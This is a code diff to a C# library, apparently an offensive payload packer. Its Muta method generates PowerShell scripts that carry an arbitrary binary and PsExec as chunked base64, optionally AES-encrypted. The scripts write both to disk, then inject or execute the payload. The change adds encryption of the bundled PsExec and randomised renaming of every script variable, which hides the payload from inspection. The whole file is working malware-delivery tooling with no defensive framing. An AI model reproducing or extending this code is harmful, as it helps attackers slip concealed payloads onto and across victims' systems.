@@ -1,7 +1,8 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics.Contracts;
 using System.Linq;
-using System.Security.Cryptography;
+using System.Text.RegularExpressions;
 using VismutaLib.Properties;
 
 namespace VismutaLib
@@ -13,8 +14,9 @@ namespace VismutaLib
         public const Int32 ZipStrength = 9; //0-9
         public const Int32 RandomFilenameLength = 8;
 
+        [Pure]
         public static String Muta(DeployMethodFlags deployFlags, Byte[] srcBinary, String payloadName,
-            String payloadExt, String payloadArgs, String keyphrase)
+            String payloadExt, String payloadArgs, String keyphrase, String keyphraseVariable)
         {
             if (srcBinary == null)
                 throw new ArgumentNullException(nameof(srcBinary));
@@ -27,38 +29,57 @@ namespace VismutaLib
 
             if (!IsValidDeployMethod(deployFlags))
                 throw new InvalidOperationException("Invalid combination of options");
+            if(String.IsNullOrWhiteSpace(keyphraseVariable) && deployFlags.HasFlag(DeployMethodFlags.ObfuscateVariables))
+                throw new ArgumentException(nameof(keyphraseVariable));
 
-            //Encrypt Payload
-            if (deployFlags.HasFlag(DeployMethodFlags.EncryptPayload))
-            {
-                if(String.IsNullOrWhiteSpace(keyphrase))
-                    throw new ArgumentException(nameof(keyphrase));
-                srcBinary = Encryption.AES256Encrypt(srcBinary, keyphrase);
-            }
-
-            String dstShell = String.Empty;
+            String dstShell = "$cwd = (Get-Item -Path \".\\\" -Verbose).FullName;" + CRLF;
             String execName = GetRandomString(RandomFilenameLength, false);
-            String srcEncoded = Convert.ToBase64String(srcBinary, Base64FormattingOptions.None);
+            Byte[] execBinary = Convert.FromBase64String(Resources.ExecEncoded); //TODO: Take out redundant steps
 
             //Deploy PSExec
             if (deployFlags.HasFlag(DeployMethodFlags.PsExec))
             {
+                //Encrypt PSExec
+                if (deployFlags.HasFlag(DeployMethodFlags.EncryptPayload))
+                {
+                    if (String.IsNullOrWhiteSpace(keyphrase))
+                        throw new ArgumentException(nameof(keyphrase));
+                    execBinary = Encryption.AES256Encrypt(execBinary, keyphrase);
+                }
+
+                String execEncoded = Convert.ToBase64String(execBinary, Base64FormattingOptions.None);
+
                 dstShell += "[string] $execEncoded = \"\"; " + CRLF;
-                foreach (String execChunk in ChunkString(Resources.ExecEncoded))
+                foreach (String execChunk in ChunkString(execEncoded))
                     dstShell += $"$execEncoded += \"{execChunk}\"; " + CRLF;
                 dstShell += "[byte[]] $exec = [System.Convert]::FromBase64String($execEncoded); " + CRLF;
-                dstShell += $"[System.IO.File]::WriteAllBytes(\"{execName}.exe\", $exec); " + CRLF;
+
+                //Decrypt PSExec
+                if (deployFlags.HasFlag(DeployMethodFlags.EncryptPayload))
+                    dstShell += Resources.AES256Decrypt.Replace(Environment.NewLine, CRLF).Replace("[[PAYLOAD]]", "$exec") + CRLF;
+
+                dstShell += $"[System.IO.File]::WriteAllBytes($cwd+\"\\{execName}.exe\", $exec); " + CRLF;
             }
 
+            //Encrypt Payload
+            if (deployFlags.HasFlag(DeployMethodFlags.EncryptPayload))
+            {
+                if (String.IsNullOrWhiteSpace(keyphrase))
+                    throw new ArgumentException(nameof(keyphrase));
+                srcBinary = Encryption.AES256Encrypt(srcBinary, keyphrase);
+            }
+
+            String srcEncoded = Convert.ToBase64String(srcBinary, Base64FormattingOptions.None);
+
             //Deploy Payload
-                dstShell += "[string] $payloadEncoded = \"\"; " + CRLF;
+            dstShell += "[string] $payloadEncoded = \"\"; " + CRLF;
             foreach (String payloadChunk in ChunkString(srcEncoded))
                 dstShell += $"$payloadEncoded += \"{payloadChunk}\"; " + CRLF;
             dstShell += "[byte[]] $payload = [System.Convert]::FromBase64String($payloadEncoded); " + CRLF;
 
             //Decrypt Payload
             if (deployFlags.HasFlag(DeployMethodFlags.EncryptPayload))
-                dstShell += Resources.AES256Decrypt.Replace(Environment.NewLine, CRLF) + CRLF;
+                dstShell += Resources.AES256Decrypt.Replace(Environment.NewLine, CRLF).Replace("[[PAYLOAD]]", "$payload") + CRLF;
 
             if (deployFlags.HasFlag(DeployMethodFlags.Inject))
             {
@@ -79,7 +100,7 @@ namespace VismutaLib
             }
             else
             {
-                dstShell += $"[System.IO.File]::WriteAllBytes(\"./{payloadName}{payloadExt}\", $payload); " + CRLF;
+                dstShell += $"[System.IO.File]::WriteAllBytes($cwd+\"\\{payloadName}{payloadExt}\", $payload); " + CRLF;
             }
 
 
@@ -91,7 +112,7 @@ namespace VismutaLib
             if (deployFlags.HasFlag(DeployMethodFlags.Deflate))
             {
                 dstShell += "Add-Type -AssemblyName System.IO.Compression.FileSystem; " + CRLF;
-                dstShell += $"[System.IO.Compression.ZipFile]::ExtractToDirectory(\"./{payloadName}{payloadExt}\", \".\"); " + CRLF;
+                dstShell += $"[System.IO.Compression.ZipFile]::ExtractToDirectory($cwd+\"\\{payloadName}{payloadExt}\", \".\"); " + CRLF;
             }
 
             //Sanity checks
@@ -109,9 +130,26 @@ namespace VismutaLib
                 else
                     dstShell += $"./{payloadName}{payloadExt} {payloadArgs}; " + CRLF;
             }
+
+            //Obfuscate variables
+            if (deployFlags.HasFlag(DeployMethodFlags.ObfuscateVariables))
+                dstShell = ObfuscatePSVariables(dstShell, keyphraseVariable);
+
             return dstShell;
         }
 
+        //NOTE: Doesn't work with non-alphanumeric variable names
+        [Pure]
+        private static String ObfuscatePSVariables(String shellText, String keyphraseVariable)
+        {
+            var regex = new Regex("\\$[a-zA-Z0-9_]+");
+            var matches = regex.Matches(shellText).OfType<Match>().Select(m => m.Value);
+            foreach (String var in matches.Distinct().Where(m => m != "$True" && m != "$False"))
+                shellText = shellText.Replace(var, var == "$inputkey" ? keyphraseVariable : "$" + GetRandomString(8, false));
+            return shellText;
+        }
+
+        [Pure]
         public static Boolean IsValidDeployMethod(DeployMethodFlags flags)
         {
             //Can't PSExec if we don't execute
@@ -133,7 +171,6 @@ namespace VismutaLib
             return true;
         }
 
-        //Useful for generating filenames
         public static String GetRandomString(Int32 length, Boolean onlyLowercase)
         {
             const String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
@@ -141,6 +178,7 @@ namespace VismutaLib
             return new String(Enumerable.Repeat(onlyLowercase ? lowercase : chars, length).Select(s => s[Random.Next(s.Length)]).ToArray());
         }
 
+        [Pure]
         private static IEnumerable<String> ChunkString(String input)
         {
             const Int32 chunkSize = 4096; //This is a sweet spot between speed (larger is better) and reliability (much more and PS hurls)
